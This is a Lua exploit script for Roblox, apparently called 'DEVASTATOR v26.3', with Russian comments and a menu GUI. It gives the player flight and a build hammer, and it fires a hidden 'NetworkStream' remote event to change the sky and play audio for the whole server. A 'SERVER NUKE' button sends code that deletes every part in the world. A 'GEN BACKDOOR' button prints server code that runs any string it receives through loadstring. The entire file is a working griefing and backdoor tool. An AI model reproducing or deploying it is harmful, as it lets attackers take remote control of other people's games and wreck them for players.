--[[
    PISHENAK DEVASTATOR v26.3 // FINAL STABLE BUILD
    ГОРЯЧИЕ КЛАВИШИ:
    'L' - Скрыть/Показать меню
    'E' - Включить/Выключить полет
    'Q' - Увеличить скорость полета
]]

local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local uis = game:GetService("UserInputService")
local coreGui = game:GetService("CoreGui")
local lighting = game:GetService("Lighting")

-- Удаление старых версий
for _, v in pairs(coreGui:GetChildren()) do if v.Name == "DevastatorFinal" then v:Destroy() end end

local sg = Instance.new("ScreenGui", coreGui)
sg.Name = "DevastatorFinal"

--------------------------------------------------
-- [1] СОЗДАНИЕ ИНТЕРФЕЙСА
--------------------------------------------------
local main = Instance.new("Frame", sg)
main.Name = "MainFrame"
main.Size = UDim2.new(0, 520, 0, 440)
main.Position = UDim2.new(0.5, -260, 0.5, -220)
main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
main.BorderSizePixel = 0
Instance.new("UICorner", main)
local stroke = Instance.new("UIStroke", main)
stroke.Color = Color3.fromRGB(255, 0, 0)
stroke.Thickness = 2

-- Заголовок (за него можно таскать)
local title = Instance.new("TextLabel", main)
title.Name = "TitleBar"
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = " DEVASTATOR v26.3 // TERMINAL ACTIVE"
title.TextColor3 = Color3.new(1, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(25, 5, 5)
title.Font = Enum.Font.Code
title.TextXAlignment = Enum.TextXAlignment.Left
Instance.new("UICorner", title)

-- Терминал (Логи)
local logBox = Instance.new("ScrollingFrame", main)
logBox.Name = "Console"
logBox.Size = UDim2.new(1, -20, 0, 140)
logBox.Position = UDim2.new(0, 10, 1, -150)
logBox.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
logBox.CanvasSize = UDim2.new(0, 0, 0, 0)
logBox.ScrollBarThickness = 3
local logLay = Instance.new("UIListLayout", logBox)

local function log(txt, col)
    local l = Instance.new("TextLabel", logBox)
    l.Size = UDim2.new(1, 0, 0, 20)
    l.Text = " [SYSTEM]: " .. txt
    l.TextColor3 = col or Color3.fromRGB(200, 0, 0)
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.Code
    l.TextXAlignment = Enum.TextXAlignment.Left
    logBox.CanvasSize = UDim2.new(0, 0, 0, logLay.AbsoluteContentSize.Y)
    logBox.CanvasPosition = Vector2.new(0, logLay.AbsoluteContentSize.Y)
end

--------------------------------------------------
-- [2] СИСТЕМА ПЕРЕМЕЩЕНИЯ (DRAG FIX)
--------------------------------------------------
local dragging, dragInput, dragStart, startPos
title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
uis.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

--------------------------------------------------
-- [3] ФУНКЦИИ (FLY, HAMMER, SS)
--------------------------------------------------
local flying = false
local flySpeed = 50
local bv, bg

local function toggleFly()
    flying = not flying
    local char = lp.Character or lp.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    if flying then
        bv = Instance.new("BodyVelocity", hrp)
        bv.MaxForce = Vector3.new(1e8, 1e8, 1e8)
        bg = Instance.new("BodyGyro", hrp)
        bg.MaxTorque = Vector3.new(1e8, 1e8, 1e8)
        log("FLY ENABLED (E)", Color3.new(0,1,0))
        task.spawn(function()
            while flying do
                local cam = workspace.CurrentCamera
                local vel = Vector3.new(0,0.1,0)
                if uis:IsKeyDown(Enum.KeyCode.W) then vel = cam.CFrame.LookVector * flySpeed end
                if uis:IsKeyDown(Enum.KeyCode.S) then vel = cam.CFrame.LookVector * -flySpeed end
                bv.Velocity = vel
                bg.CFrame = cam.CFrame
                task.wait()
            end
        end)
    else
        if bv then bv:Destroy() end
        if bg then bg:Destroy() end
        log("FLY DISABLED", Color3.new(1,0,0))
    end
end

local function giveHammer()
    local hb = Instance.new("HopperBin", lp.Backpack)
    hb.BinType = Enum.HopperBinType.Hammer
    hb.Name = "DEVASTATOR_HAMMER"
    log("HAMMER (B-TOOLS) GIVEN", Color3.new(0,1,1))
end

local function sendGlobal(code, val)
    local stream = rs:FindFirstChild("NetworkStream") or rs:FindFirstChild("InternalStatus")
    if stream then
        stream:FireServer(code, val)
        log("SIGNAL SENT: " .. code, Color3.new(0,1,0))
    else
        log("NO BACKDOOR FOUND (LOCAL ONLY)", Color3.new(1,0.5,0))
        if code == 882 then
            local s = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", lighting)
            s.SkyboxBk = val s.SkyboxDn = val s.SkyboxFt = val
            s.SkyboxLf = val s.SkyboxRt = val s.SkyboxUp = val
        end
    end
end

--------------------------------------------------
-- [4] КНОПКИ УПРАВЛЕНИЯ
--------------------------------------------------
local idInput = Instance.new("TextBox", main)
idInput.Size = UDim2.new(0, 300, 0, 35)
idInput.Position = UDim2.new(0.5, -150, 0, 55)
idInput.PlaceholderText = "ID / CODE"
idInput.BackgroundColor3 = Color3.fromRGB(30,30,30)
idInput.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", idInput)

local grid = Instance.new("Frame", main)
grid.Size = UDim2.new(1, -20, 0, 180)
grid.Position = UDim2.new(0, 10, 0, 100)
grid.BackgroundTransparency = 1
Instance.new("UIGridLayout", grid).CellSize = UDim2.new(0, 160, 0, 35)

local function btn(txt, cb)
    local b = Instance.new("TextButton", grid)
    b.Text = txt b.BackgroundColor3 = Color3.fromRGB(40, 5, 5)
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.Code
    b.MouseButton1Click:Connect(cb)
    Instance.new("UICorner", b)
end

btn("GLOBAL SKY", function() sendGlobal(882, "rbxassetid://"..idInput.Text) end)
btn("GLOBAL AUDIO", function() sendGlobal(993, "rbxassetid://"..idInput.Text) end)
btn("GIVE HAMMER", giveHammer)
btn("FLY ON/OFF (E)", toggleFly)
btn("SPEED + (Q)", function() flySpeed = flySpeed + 25 log("FLY SPEED: "..flySpeed) end)
btn("SERVER NUKE", function() sendGlobal(771, "for _,v in pairs(workspace:GetDescendants()) do if v:IsA('BasePart') then v:Destroy() end end") end)

btn("GEN BACKDOOR", function()
    local code = "local s=game:GetService('ReplicatedStorage') local r=Instance.new('RemoteEvent',s) r.Name='NetworkStream' r.OnServerEvent:Connect(function(_,i,v) if i==882 then local l=game:GetService('Lighting') local k=l:FindFirstChildOfClass('Sky') or Instance.new('Sky',l) k.SkyboxBk=v k.SkyboxDn=v k.SkyboxFt=v k.SkyboxLf=v k.SkyboxRt=v k.SkyboxUp=v elseif i==993 then local sn=Instance.new('Sound',workspace) sn.SoundId=v sn.Volume=10 sn:Play() elseif i==771 then loadstring(v)() end end)"
    print(code)
    log("CODE PRINTED TO F9 CONSOLE!", Color3.new(1,1,0))
end)

--------------------------------------------------
-- [5] БИНДЫ
--------------------------------------------------
uis.InputBegan:Connect(function(k, g)
    if g then return end
    if k.KeyCode == Enum.KeyCode.L then main.Visible = not main.Visible end
    if k.KeyCode == Enum.KeyCode.E then toggleFly() end
    if k.KeyCode == Enum.KeyCode.Q then flySpeed = flySpeed + 20 end
end)

log("DEVASTATOR v26.3 INITIATED.")
log("USE 'L' TO TOGGLE MENU.")
